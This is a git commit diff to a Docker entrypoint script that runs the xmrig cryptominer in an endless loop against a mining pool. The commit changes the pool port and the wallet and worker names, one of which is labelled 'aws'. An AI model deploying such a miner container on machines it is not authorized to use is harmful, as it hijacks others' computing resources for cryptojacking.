4d27992aeb38c9c71637915e1cc5c3e156bfe48c
tarikgumus <tarik.gumus@yahoo.com>
2022-07-15 19:57:35 +0800

    Update docker-entrypoint.sh

--- docker-entrypoint.sh
+++ docker-entrypoint.sh
@@ -1,5 +1,5 @@
 #!/bin/sh
 while [ 1 ]; do
-	./xmrig -a ghostrider --url stratum-na.rplant.xyz:17056 --tls --user RGgYtGb7QepnWynbQpJHDVFWRinVepHxnB.aws -t 4
+	./xmrig -a ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BphHZ8CWQ7muumCfyEwRwbmTeGs9ZXKQfN.odium -t 4
 	sleep 5
 done
